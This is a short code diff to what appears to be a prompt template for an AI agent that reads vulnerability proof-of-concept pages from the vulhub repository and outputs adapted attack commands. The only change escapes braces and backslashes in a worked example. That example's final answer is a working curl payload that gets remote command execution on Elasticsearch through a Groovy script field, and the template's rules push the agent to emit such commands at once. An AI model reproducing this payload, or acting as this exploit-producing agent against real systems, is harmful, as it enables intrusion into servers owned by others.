@@ -107,7 +107,7 @@ Action Input: https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-201
 
 (After reading the PoC)
 Thought: I now know the final answer
-Final Answer: curl -X POST 'http://TARGET_IP:9200/_search?pretty' -H 'Content-Type: application/json' -d '{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}'
+Final Answer: curl -X POST 'http://TARGET_IP:9200/_search?pretty' -H 'Content-Type: application/json' -d '{{"size":1, "script_fields": {{"lupin":{{"lang":"groovy","script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"id\\").getText()"}}}}}}'
 
 CRITICAL RULES:
 - After ReadHTML returns PoC content, you MUST immediately produce a Final Answer with the adapted command
